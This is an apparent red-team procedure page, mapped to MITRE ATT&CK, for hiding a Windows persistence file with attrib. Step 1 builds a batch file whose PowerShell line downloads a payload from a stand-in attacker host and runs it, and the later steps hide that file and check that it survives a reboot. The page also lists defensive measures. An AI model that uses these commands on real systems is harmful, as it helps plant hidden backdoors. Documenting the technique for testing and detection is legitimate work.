---
id: 2747fb30-1416-46d5-b4d2-3b8e96a44137
name: windows-hide-file-for-persistence
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:27.749292+00:00'
updated_at: '2023-04-10T20:37:22.022270+00:00'
tactics:
  - '[[tactics/Defense Evasion|TA0005 - Defense Evasion]]'
techniques:
  - '[[techniques/Hide Artifacts|T1564 - Hide Artifacts]]'
sub_techniques:
  - >-
    [[sub-techniques/Hidden Files and Directories|T1564.001 - Hidden Files and
    Directories]]
tags:
  - simple-user
  - windows-persistence
commands:
  - '[[commands/windows-attrib-set-file-hidden]]'
platforms:
  - Windows
tools: []
validated: true
---

# windows-hide-file-for-persistence

## Summary

This procedure demonstrates how to hide a file on a Windows system using the built-in attrib command to set the hidden attribute, enabling simple persistence by evading casual file enumeration and detection during red team operations or post-exploitation scenarios.

## Description

Hiding files on Windows is a basic defense evasion technique that leverages the file system's hidden attribute to conceal persistence mechanisms, such as backdoor scripts or configuration files, from standard directory listings in File Explorer or basic command-line tools like dir (unless show hidden files is enabled). This method is particularly useful for low-privilege users maintaining access without drawing attention. The procedure assumes initial access to the target system and focuses on selecting and hiding a file like autoexec.bat in a persistent location such as the root drive. It maps to MITRE ATT&CK's Hide Artifacts technique, allowing attackers to store malicious payloads that survive reboots or basic cleanup efforts. Detection can be bypassed if defenders do not enforce strict file visibility policies, but advanced EDR tools may still flag attribute changes.

## Requirements

1. Local access to the target Windows system (user-level privileges suffice; no admin required for user-writable files).
2. A target file for persistence, such as a batch script or executable placed in a startup directory (e.g., C:\autoexec.bat for legacy compatibility).
3. Command Prompt or PowerShell access on the system.

## Defense

- Enable and enforce visibility of hidden files and system files in Windows Explorer and command-line tools (e.g., dir /a:h).
- Deploy file integrity monitoring (FIM) solutions to alert on attribute changes to files in sensitive directories.
- Use endpoint detection and response (EDR) tools to monitor process execution and file system modifications, correlating with persistence indicators like unusual attrib usage.

## Objectives

1. Conceal a persistence file to evade basic detection mechanisms.
2. Maintain access to the compromised system post-reboot or cleanup.
3. Minimize footprint for stealthy operations in user-context environments.

## Instructions

### Step 1: Identify or Create the Persistence File

**Context**: Select or create a file that will serve as your persistence mechanism, such as a batch file that executes a backdoor on startup. Place it in a location like C:\ for simplicity, ensuring it's writable by the current user.

For example, create a simple batch file if needed:

```cmd
 echo @echo off > c:\autoexec.bat
 echo powershell -c "Invoke-WebRequest -Uri http://attacker.com/payload.ps1 -OutFile $env:TEMP\p.ps1; . $env:TEMP\p.ps1" >> c:\autoexec.bat
```

This step ensures the file exists and is ready for hiding. Verify with `dir c:\` to confirm visibility before proceeding.

### Step 2: Set the Hidden Attribute

**Context**: Use the attrib command to apply the hidden attribute (+h), making the file invisible in standard listings. This step directly implements the evasion, allowing the file to persist without immediate detection.

**Command** ([[commands/windows-attrib-set-file-hidden]]):
```cmd
attrib +h c:\autoexec.bat
```

> The attrib command modifies file attributes without altering content. The +h flag sets the hidden property. Expected output is silent on success (no message), but you can verify by running `dir c:\ /a` – the file should only appear with the /a flag. If the file path is incorrect, you'll see an error like "File Not Found." This confirms the file is now hidden and ready for persistence testing.

### Step 3: Verify Persistence and Hiding

**Context**: Test that the file remains hidden and executes on relevant triggers (e.g., reboot for autoexec.bat). This validates the procedure's effectiveness.

Run `dir c:\` to confirm the file is not listed, then `dir c:\ /a:h` to see it with attributes (should show H for hidden). For persistence, reboot the system and check if the file executes (monitor network callbacks or logs).

> Success here means the file survives visibility checks and maintains functionality, indicating a viable persistence vector.
